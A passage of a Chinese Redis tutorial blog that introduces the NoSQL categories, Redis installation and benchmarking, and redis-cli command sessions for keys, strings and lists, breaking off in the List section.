<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 1、商品的基本信息</span><br><span class="line">  名称、价格、商家信息</span><br><span class="line">  关系型数据库就可以解决了！ MySQL / Oracle （淘宝早年就去IOE了！- 王坚：推荐文章：阿里云的这群疯子）</span><br><span class="line">  淘宝内部的 MySQL 不是大家用的 MySQL</span><br><span class="line"># 2、商品的描述、评论（文字比较多）</span><br><span class="line">  文档型数据库中，MongoDB</span><br><span class="line"># 3、图片</span><br><span class="line">  - 分布式文件系统 FastDFS</span><br><span class="line">  - 淘宝自己的 TFS</span><br><span class="line">  - Google的 GFS</span><br><span class="line">  - Hadoop HDFS</span><br><span class="line">  - 阿里云的 oss</span><br><span class="line"># 4、商品的关键字 （搜索）</span><br><span class="line">  - 搜索引擎 solr elasticsearch</span><br><span class="line">  - ISearch：多隆（多去了解一下这些技术大佬！）</span><br><span class="line">  - 所有牛逼的人都有一段苦逼的岁月！但是你只要像SB一样的去坚持，终将牛逼！</span><br><span class="line"># 5、商品热门信息</span><br><span class="line">  - 内存数据库</span><br><span class="line">  - Redis、 Tair、Memache...</span><br><span class="line"># 6、商品的交易，外部的支付接口</span><br><span class="line">  - 三方应用 </span><br><span class="line">.....</span><br></pre></td></tr></table></figure>

<p>要知道，一个简单地网页背后的技术一定不是大家所想的那么简单</p>
<p>大型互联网应用问题</p>
<ul>
<li>数据类型太多了</li>
<li>数据源繁多，经常重构</li>
<li>数据要改造，大面积改造</li>
</ul>
<p>解决问题：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/a4cce34dabdbf7356b024032970e5231--14a5--image-20240917204845891.png" alt="image-20240917204845891"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/d7215a33aceaa04e565ac394bff08bf1--643b--image-20240917204854879.png" alt="image-20240917204854879"></p>
<p>这里以上都是NoSQL入门概述，不仅能够提高大家的知识，还可以帮助大家了解大厂的工作内容</p>
<h2 id="4、NoSQL的四大分类"><a href="#4、NoSQL的四大分类" class="headerlink" title="4、NoSQL的四大分类"></a>4、NoSQL的四大分类</h2><ol>
<li><p>键值(Key-Value)存储数据库</p>
<p><strong>这一类数据库主要会使用到一个哈希表，这个表中有一个特定的键和一个指针指向特定的数据</strong>。Key&#x2F;value模型对于IT系统来说的优势在于简单、易部署。但是如果DBA（数据库管理员）只对部分值进行查询或更新的时候，Key&#x2F;value就显得效率低下了。举例如：Tokyo Cabinet&#x2F;Tyrant, <strong>Redis</strong>, Voldemort, Oracle BDB</p>
</li>
<li><p>列存储数据库</p>
<p>这部分数据库通常是用来应对分布式存储的海量数据。键仍然存在，但是它们的特点是指向了多个列。这些列是由列家族来安排的。如：Cassandra, <strong>HBase</strong>, Riak.</p>
</li>
<li><p>文档型数据库</p>
<p>文档型数据库的灵感是来自于Lotus Notes办公软件的，而且它同第一种键值存储相类似。该类型的数据模型是版本化的文档，半结构化的文档以特定的格式存储，比如JSON。文档型数据库可 以看作是键值数据库的升级版，允许之间嵌套键值。而且文档型数据库比键值数据库的查询效率更高。如：CouchDB, <strong>MongoDb</strong>. 国内也有文档型数据库SequoiaDB，目前已经开源</p>
</li>
<li><p>图形(Graph)数据库</p>
<p>图形结构的数据库同其他行列以及刚性结构的SQL数据库不同，它是使用灵活的图形模型，并且能够扩展到多个服务器上。NoSQL数据库没有标准的查询语言(SQL)，因此进行数据库查询需要制定数据模型。许多NoSQL数据库都有REST式的数据接口或者查询API。 如：<strong>Neo4J</strong>, InfoGrid, Infinite Graph</p>
</li>
</ol>
<blockquote>
<p>对比</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/0b29faa408d9be60261b86f242bf839c--c4b5--image-20240917205245441.png" alt="image-20240917205245441"></p>
<h1 id="二、redis入门"><a href="#二、redis入门" class="headerlink" title="二、redis入门"></a>二、redis入门</h1><h2 id="1、概述"><a href="#1、概述" class="headerlink" title="1、概述"></a>1、概述</h2><blockquote>
<p>redis是什么？？</p>
</blockquote>
<p><strong>Redis</strong>（Remote Dictionary Server )，即远程字典服务 !</p>
<p>是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/2c859dce2432fbf1b9d4ad58eacad586--2e0a--image-20240917205629626.png" alt="image-20240917205629626"></p>
<p>redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。</p>
<p>免费和开源！是当下最热门的 NoSQL 技术之一！也被人们称之为结构化数据库！</p>
<blockquote>
<p>redis能干嘛？</p>
</blockquote>
<ol>
<li>内存存储、持久化，内存中是断电即失、所以说持久化很重要（rdb，aof）</li>
<li>效率高，可以用于高速缓存</li>
<li>发布订阅系统</li>
<li>地图信息分析</li>
<li>计时器、计数器（浏览量！）</li>
<li>…</li>
</ol>
<blockquote>
<p>特性</p>
</blockquote>
<ol>
<li>多样的数据类型</li>
<li>持久化</li>
<li>集群</li>
<li>事务</li>
<li>…</li>
</ol>
<blockquote>
<p>学习中用到的东西</p>
</blockquote>
<ol>
<li><p>官网：<a href="https://redis.io/">https://redis.io/</a></p>
</li>
<li><p>中文网：<a href="http://www.redis.cn/">http://www.redis.cn/</a></p>
</li>
<li><p>下载地址：<a href="https://redis.io/download/">https://redis.io/download/</a></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/3d70629585eeb9924216c692083c3396--b22c--image-20240917205651085.png" alt="image-20240917205651085"></p>
<p>注意：Wdinow在 Github上下载（停更很久了！）</p>
<p>Redis推荐都是在Linux服务器上搭建的，我们是基于Linux学习！</p>
</li>
</ol>
<h2 id="2、WIndows下Redis的安装"><a href="#2、WIndows下Redis的安装" class="headerlink" title="2、WIndows下Redis的安装"></a>2、WIndows下Redis的安装</h2><p>1、下载压缩包直接使用即可。下载地址：<a href="https://github.com/tporadowski/redis/releases">https://github.com/tporadowski/redis/releases</a></p>
<p>2、打开server服务，再使用client去连接，即可直接命令行使用。</p>
<blockquote>
<p>记住一句话，Window下使用确实简单，但是Redis 推荐我们使用Linux去开发使用！</p>
</blockquote>
<h2 id="3、Linux安装"><a href="#3、Linux安装" class="headerlink" title="3、Linux安装"></a>3、Linux安装</h2><ul>
<li>直接找到官网链接对应的下载安装方法   链接：<a href="https://redis.io/docs/latest/operate/oss_and_stack/install/install-redis/install-redis-on-linux/">https://redis.io/docs/latest/operate/oss_and_stack/install/install-redis/install-redis-on-linux/</a></li>
<li>使用snap再Ubuntu上安装</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install redis-tools <span class="comment"># for redis-cli</span></span><br><span class="line">sudo snap install redis</span><br></pre></td></tr></table></figure>

<ul>
<li>一些常见的snap操作redis的命令</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo snap start redis</span><br><span class="line">sudo snap stop redis</span><br><span class="line">sudo snap restart redis</span><br><span class="line">sudo snap services redis</span><br></pre></td></tr></table></figure>

<ul>
<li>但这里我们就不使用这种方式了，我们可以去自己下载对应的源码编译</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://download.redis.io/redis-stable.tar.gz</span><br><span class="line"></span><br><span class="line">tar -zxvf redis-stable.tar.gz</span><br><span class="line"></span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<ul>
<li>然后就是可以进入我们默认的安装路径<code>/usr/local/bin/</code>，可以发现已经成功安装上了</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-18/08fda3803d6cf30473591657d682416a--379d--image-20240918162219684.png" alt="image-20240918162219684"></p>
<ul>
<li>然后我们就可以去创建一个文件夹专门去存放我们的配置文件，方便我们之后的使用</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> myconfig</span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> /home/ubuntu/tools/redis/redis-stable/redis.conf myconfig/</span><br></pre></td></tr></table></figure>

<ul>
<li>修改配置文件，开启守护进程，使redis能够在后台运行</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-18/ba0c73fe44558e4c53d074f59bfb16d9--1e37--image-20240918162915219.png" alt="image-20240918162915219"></p>
<ul>
<li>使用我们自己的配置文件去启动redis服务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/usr/local/bin# redis-server myconfig/redis.conf</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-18/b350fb9a014f081cc57605c128f8a231--84f1--image-20240918163216764.png" alt="image-20240918163216764"></p>
<ul>
<li>成功完成启动和连接</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-18/e2619002790475090bd5f274f37086ae--742f--image-20240918163307637.png" alt="image-20240918163307637"></p>
<ul>
<li>关闭redis并退出</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; shutdown</span><br><span class="line">not connected&gt; <span class="built_in">exit</span></span><br><span class="line">root@VM-16-10-ubuntu:/usr/local/bin<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<h2 id="4、压力测试"><a href="#4、压力测试" class="headerlink" title="4、压力测试"></a>4、压力测试</h2><ul>
<li>redis-benchmark是一个压力测试工具</li>
<li>官方自带的性能测试工具</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-18/1cd8394c333815e2933deb276bc14f2c--d917--image-20240918163836563.png" alt="image-20240918163836563"></p>
<p>我们来简单测试一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试100个并发，100个请求</span><br><span class="line">redis-benchmark -h localhost -p 6379 -c 100 -n 100</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-18/292b8273c8c6db63fe7d6bf7d2d3e327--6b75--image-20240918164542352.png" alt="image-20240918164542352"></p>
<p>中间的部分就是不同毫秒时处理总数据的百分比以及延迟；最后的部分就是算出的平均吞吐量了。总体来说，吞吐速度还是很不错的。</p>
<h2 id="5、基础知识"><a href="#5、基础知识" class="headerlink" title="5、基础知识"></a>5、基础知识</h2><ul>
<li>redis默认有16个数据库，这可以在redis.conf配置文件中可以看到</li>
<li>可以在配置文件中修改databases的值去修改默认的数据库的数量</li>
<li>数据库默认使用的是第0个数据库</li>
<li>redis使用时可以使用select去切换数据库</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; dbsize <span class="comment"># 查看db大小</span></span><br><span class="line">(<span class="built_in">integer</span>) 9</span><br><span class="line">127.0.0.1:6379&gt; keys * <span class="comment"># 查看当前数据库所有的key</span></span><br><span class="line">1) <span class="string">&quot;key:__rand_int__&quot;</span></span><br><span class="line">2) <span class="string">&quot;c&quot;</span></span><br><span class="line">3) <span class="string">&quot;b&quot;</span></span><br><span class="line">4) <span class="string">&quot;mystream&quot;</span></span><br><span class="line">5) <span class="string">&quot;myhash&quot;</span></span><br><span class="line">6) <span class="string">&quot;counter:__rand_int__&quot;</span></span><br><span class="line">7) <span class="string">&quot;a&quot;</span></span><br><span class="line">8) <span class="string">&quot;d&quot;</span></span><br><span class="line">9) <span class="string">&quot;mylist&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; <span class="keyword">select</span> 3 <span class="comment"># 切换至3号数据库</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379[3]&gt; <span class="comment"># 切换成功</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>清空当前数据库<code>flushdb</code></p>
</li>
<li><p>清除所有数据库<code>flushall</code></p>
</li>
</ul>
<blockquote>
<p>Redis 是单线程的！</p>
</blockquote>
<p>明白Redis是很快的，官方表示，<strong>Redis是基于内存操作，CPU不是Redis性能瓶颈，Redis的瓶颈是根据机器的内存和网络带宽</strong>，既然可以使用单线程来实现，就使用单线程了！所以就使用了单线程了！</p>
<p>Redis 是C 语言写的，官方提供的数据为 10W+ 的QPS，完全不比同样是使用 key-vale的Memecache差！</p>
<p><strong>Redis为什么单线程还这么快？</strong></p>
<p>1、误区1：高性能的服务器一定是多线程的？</p>
<p>2、误区2：多线程（CPU上下文会切换！）一定比单线程效率高！</p>
<p>速度：CPU&gt;内存&gt;硬盘</p>
<p>核心：redis 是将所有的数据全部放在内存中的，所以说使用单线程去操作效率就是最高的，</p>
<p>多线程（CPU上下文会切换：耗时的操作！！！），对于内存系统来说，如果没有上下文切换效率就是最高的！</p>
<p>多次读写都是在一个CPU上的，在内存情况下，这个就是最佳的方案！</p>
<h1 id="三、五大数据类型"><a href="#三、五大数据类型" class="headerlink" title="三、五大数据类型"></a>三、五大数据类型</h1><p>Redis 是一个开源（BSD许可）的，内存中的数据结构存储系统，它可以用作数据库、缓存和消息中间件MQ。 它支持多种类型的数据结构，如 字符串（strings）， 散列（hashes）， 列表（lists）， 集合（sets）， 有序集合（sorted sets） 与范围查询， bitmaps， hyperloglogs 和 地理空间（geospatial） 索引半径查询。 Redis 内置了 复制（replication），LUA脚本（Lua scripting）， LRU驱动事件（LRU eviction），事务（transactions） 和不同级别的 磁盘持久化（persistence）， 并通过Redis哨兵（Sentinel）和自动 分区（Cluster）提供高可用性（high availability）。</p>
<h2 id="1、常见命令"><a href="#1、常见命令" class="headerlink" title="1、常见命令"></a>1、常见命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379[3]&gt; keys *  <span class="comment"># 查看所有的key</span></span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379[3]&gt; clear <span class="comment"># 清屏</span></span><br><span class="line">127.0.0.1:6379[3]&gt; <span class="built_in">set</span> name zyy <span class="comment"># set key</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379[3]&gt; keys *</span><br><span class="line">1) <span class="string">&quot;name&quot;</span></span><br><span class="line">127.0.0.1:6379[3]&gt; <span class="built_in">set</span> age 1</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379[3]&gt; keys *</span><br><span class="line">1) <span class="string">&quot;age&quot;</span></span><br><span class="line">2) <span class="string">&quot;name&quot;</span></span><br><span class="line">127.0.0.1:6379[3]&gt; exists name <span class="comment"># 判断key是否存在 1存在，0不存在</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379[3]&gt; exists name1</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379[3]&gt; move name 1 <span class="comment"># 将key移动到1号数据库</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379[3]&gt; keys *</span><br><span class="line">1) <span class="string">&quot;age&quot;</span></span><br><span class="line">127.0.0.1:6379[3]&gt; <span class="keyword">select</span> 1 <span class="comment"># 切换1号数据库</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379[1]&gt; keys *</span><br><span class="line">1) <span class="string">&quot;name&quot;</span></span><br><span class="line">127.0.0.1:6379[1]&gt; get name <span class="comment"># get value</span></span><br><span class="line"><span class="string">&quot;zyy&quot;</span></span><br><span class="line">127.0.0.1:6379[1]&gt; <span class="keyword">select</span> 3</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379[3]&gt; keys *</span><br><span class="line">1) <span class="string">&quot;age&quot;</span></span><br><span class="line">127.0.0.1:6379[3]&gt; ttl name <span class="comment"># 返回key的过期时间，-2 代表key不存在，-1代表存在可以，但是没有设置过期时间</span></span><br><span class="line">(<span class="built_in">integer</span>) -2</span><br><span class="line">127.0.0.1:6379[3]&gt; ttl age</span><br><span class="line">(<span class="built_in">integer</span>) -1</span><br><span class="line">127.0.0.1:6379[3]&gt; <span class="built_in">set</span> name3 3</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379[3]&gt; keys *</span><br><span class="line">1) <span class="string">&quot;age&quot;</span></span><br><span class="line">2) <span class="string">&quot;name3&quot;</span></span><br><span class="line">127.0.0.1:6379[3]&gt; <span class="built_in">set</span> name zyy</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379[3]&gt; keys *</span><br><span class="line">1) <span class="string">&quot;age&quot;</span></span><br><span class="line">2) <span class="string">&quot;name&quot;</span></span><br><span class="line">3) <span class="string">&quot;name3&quot;</span></span><br><span class="line">127.0.0.1:6379[3]&gt; expire name 10 <span class="comment">#设置key的过期时间，单位秒</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379[3]&gt; ttl name</span><br><span class="line">(<span class="built_in">integer</span>) 6</span><br><span class="line">127.0.0.1:6379[3]&gt; ttl name</span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379[3]&gt; ttl name</span><br><span class="line">(<span class="built_in">integer</span>) 2</span><br><span class="line">127.0.0.1:6379[3]&gt; ttl name</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379[3]&gt; ttl name</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379[3]&gt; ttl name</span><br><span class="line">(<span class="built_in">integer</span>) -2</span><br><span class="line">127.0.0.1:6379[3]&gt; keys *</span><br><span class="line">1) <span class="string">&quot;age&quot;</span></span><br><span class="line">2) <span class="string">&quot;name3&quot;</span></span><br><span class="line">127.0.0.1:6379[3]&gt; <span class="built_in">type</span> age <span class="comment"># 查看key的数据类型</span></span><br><span class="line">string</span><br><span class="line">127.0.0.1:6379[3]&gt; del k1 <span class="comment"># 删除已存在的键。不存在的 key 会被忽略。</span></span><br></pre></td></tr></table></figure>

<h2 id="2、String（字符串）"><a href="#2、String（字符串）" class="headerlink" title="2、String（字符串）"></a>2、String（字符串）</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#################################################</span></span><br><span class="line"><span class="comment">## 设置值 获取值 字符串长度  追加</span></span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> key1 v1 <span class="comment"># 设置值</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get key1 <span class="comment"># 获取值</span></span><br><span class="line"><span class="string">&quot;v1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; keys * <span class="comment"># 查看所有的key</span></span><br><span class="line">1) <span class="string">&quot;key1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; exists key1 <span class="comment"># 判断key是否存在，存在返回1 ，不存在返回0</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; exists key2</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; append key1 <span class="string">&quot; hello&quot;</span> <span class="comment"># 追加字符串，返回总长度  当key存在就追加，当key不存在就相当于set key</span></span><br><span class="line">(<span class="built_in">integer</span>) 8</span><br><span class="line">127.0.0.1:6379&gt; get key1</span><br><span class="line"><span class="string">&quot;v1 hello&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; strlen key1 <span class="comment"># 获取字符串的长度</span></span><br><span class="line">(<span class="built_in">integer</span>) 8</span><br><span class="line">127.0.0.1:6379&gt; strlen key2</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">1) <span class="string">&quot;key1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; append key1 <span class="string">&quot;,zyy&quot;</span></span><br><span class="line">(<span class="built_in">integer</span>) 12</span><br><span class="line">127.0.0.1:6379&gt; strlen key1</span><br><span class="line">(<span class="built_in">integer</span>) 12</span><br><span class="line">127.0.0.1:6379&gt; append key2 <span class="string">&quot;zyy&quot;</span></span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379&gt; get key1</span><br><span class="line"><span class="string">&quot;v1 hello,zyy&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; get key2</span><br><span class="line"><span class="string">&quot;zyy&quot;</span></span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line"><span class="comment">## 自增 自检 ###</span></span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> views 0</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get views</span><br><span class="line"><span class="string">&quot;0&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; incr views <span class="comment"># 自增1 </span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; incr views</span><br><span class="line">(<span class="built_in">integer</span>) 2</span><br><span class="line">127.0.0.1:6379&gt; get views</span><br><span class="line"><span class="string">&quot;2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; decr views <span class="comment"># 自减1 </span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; decr views</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; decr views</span><br><span class="line">(<span class="built_in">integer</span>) -1</span><br><span class="line">127.0.0.1:6379&gt; decr views</span><br><span class="line">(<span class="built_in">integer</span>) -2</span><br><span class="line">127.0.0.1:6379&gt; get views</span><br><span class="line"><span class="string">&quot;-2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; incrby views 10 <span class="comment"># 可以设置步长，指定增量</span></span><br><span class="line">(<span class="built_in">integer</span>) 8</span><br><span class="line">127.0.0.1:6379&gt; decrby views 5</span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line"><span class="comment">## 截取字符串  替换字符串</span></span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> key1 <span class="string">&quot;hello,zyy&quot;</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get key1</span><br><span class="line"><span class="string">&quot;hello,zyy&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; getrange key1 0 3  <span class="comment"># 截取字符串[0,3]</span></span><br><span class="line"><span class="string">&quot;hell&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; getrange key1 0 -1 <span class="comment"># 获取全部字符串 和 get key 一样</span></span><br><span class="line"><span class="string">&quot;hello,zyy&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> key2 123456</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get key2</span><br><span class="line"><span class="string">&quot;123456&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; setrange key2 1 bcd <span class="comment"># 替换指定位置开始的字符串</span></span><br><span class="line">(<span class="built_in">integer</span>) 6</span><br><span class="line">127.0.0.1:6379&gt; get key2</span><br><span class="line"><span class="string">&quot;1bcd56&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line"><span class="comment">## 设置过期时间  setnx可用于分布式锁</span></span><br><span class="line">127.0.0.1:6379&gt; setex key1 30 <span class="string">&quot;hello&quot;</span> <span class="comment"># 设置key1的值为hello 并且30秒后过期</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; ttl key1 <span class="comment"># 剩余时间</span></span><br><span class="line">(<span class="built_in">integer</span>) 24</span><br><span class="line">127.0.0.1:6379&gt; ttl key1</span><br><span class="line">(<span class="built_in">integer</span>) 22</span><br><span class="line">127.0.0.1:6379&gt; setnx key2 <span class="string">&quot;123&quot;</span> <span class="comment"># 如果key2不存在，就创建key2,创建成功，返回1</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">1) <span class="string">&quot;key2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; setnx key2 <span class="string">&quot;456&quot;</span> <span class="comment"># 如果key2存在，就创建key2失败，返回0</span></span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; mset k1 v1 k2 v2 k3 v3 <span class="comment"># 同时设置多个值</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">1) <span class="string">&quot;k2&quot;</span></span><br><span class="line">2) <span class="string">&quot;k3&quot;</span></span><br><span class="line">3) <span class="string">&quot;k1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; mget k1 k2 k3 <span class="comment"># 同时获取多个值</span></span><br><span class="line">1) <span class="string">&quot;v1&quot;</span></span><br><span class="line">2) <span class="string">&quot;v2&quot;</span></span><br><span class="line">3) <span class="string">&quot;v3&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; mget k1 k2 k3 k4</span><br><span class="line">1) <span class="string">&quot;v1&quot;</span></span><br><span class="line">2) <span class="string">&quot;v2&quot;</span></span><br><span class="line">3) <span class="string">&quot;v3&quot;</span></span><br><span class="line">4) (nil)</span><br><span class="line">127.0.0.1:6379&gt; msetnx k1 v1 k4 v4  <span class="comment"># msetnx 是一个原子性的操作，要么一起成功，要么一起失败！</span></span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; get k4</span><br><span class="line">(nil)</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> user:1 &#123;name:zyy,age:18&#125; <span class="comment"># 设置一个user:1 对象，值为json字符来保存一个对象</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">1) <span class="string">&quot;k2&quot;</span></span><br><span class="line">2) <span class="string">&quot;k3&quot;</span></span><br><span class="line">3) <span class="string">&quot;k1&quot;</span></span><br><span class="line">4) <span class="string">&quot;user:1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; get user:1:name</span><br><span class="line">(nil)</span><br><span class="line">127.0.0.1:6379&gt; get user:1</span><br><span class="line"><span class="string">&quot;&#123;name:zyy,age:18&#125;&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> user:2 &#123;name:zyy2,age:18&#125;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">1) <span class="string">&quot;k2&quot;</span></span><br><span class="line">2) <span class="string">&quot;k1&quot;</span></span><br><span class="line">3) <span class="string">&quot;k3&quot;</span></span><br><span class="line">4) <span class="string">&quot;user:1&quot;</span></span><br><span class="line">5) <span class="string">&quot;user:2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; mset user:1:name zyy user:1:age 18 <span class="comment"># 这里的key是一个巧妙的设计： user:&#123;id&#125;:&#123;filed&#125; , 如此设计在Redis中是完全OK了！</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">1) <span class="string">&quot;k2&quot;</span></span><br><span class="line">2) <span class="string">&quot;k1&quot;</span></span><br><span class="line">3) <span class="string">&quot;k3&quot;</span></span><br><span class="line">4) <span class="string">&quot;user:1&quot;</span></span><br><span class="line">5) <span class="string">&quot;user:1:age&quot;</span></span><br><span class="line">6) <span class="string">&quot;user:1:name&quot;</span></span><br><span class="line">7) <span class="string">&quot;user:2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; mget user:1:name user:1:age</span><br><span class="line">1) <span class="string">&quot;zyy&quot;</span></span><br><span class="line">2) <span class="string">&quot;18&quot;</span></span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line"><span class="comment">## getset 先get再set</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; getset k1 v1 <span class="comment"># 先get，再set  如果一开始key就不存在，就返回nil</span></span><br><span class="line">(nil)</span><br><span class="line">127.0.0.1:6379&gt; get k1</span><br><span class="line"><span class="string">&quot;v1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; getset k1 1 <span class="comment"># # 先get，再set  如果一开始值存在，就反正这个值（返回的旧值，设置的新值）</span></span><br><span class="line"><span class="string">&quot;v1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; get k1</span><br><span class="line"><span class="string">&quot;1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br></pre></td></tr></table></figure>

<p>String类似的使用场景：value除了是我们的字符串还可以是我们的数字！</p>
<ul>
<li>计数器</li>
<li>粉丝数</li>
<li>对象缓存存储</li>
</ul>
<h2 id="3、List（列表）"><a href="#3、List（列表）" class="headerlink" title="3、List（列表）"></a>3、List（列表）</h2><p>Redis列表是简单的字符串列表，按照插入顺序排序。按照插入顺序排序。你可以添加一个元素到列表的头部（左边）或者尾部（右边）</p>
<p>在redis里面，我们可以把list玩成 栈、队列、阻塞队列！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; lpush list a b c <span class="comment"># 将一个或者多个值插入列表头部（左）</span></span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 1 <span class="comment"># 获取指定范围的列表</span></span><br><span class="line">1) <span class="string">&quot;c&quot;</span></span><br><span class="line">2) <span class="string">&quot;b&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; lrange list 0 -1 <span class="comment"># 获取列表中的所有值</span></span><br><span class="line">1) <span class="string">&quot;c&quot;</span></span><br><span class="line">2) <span 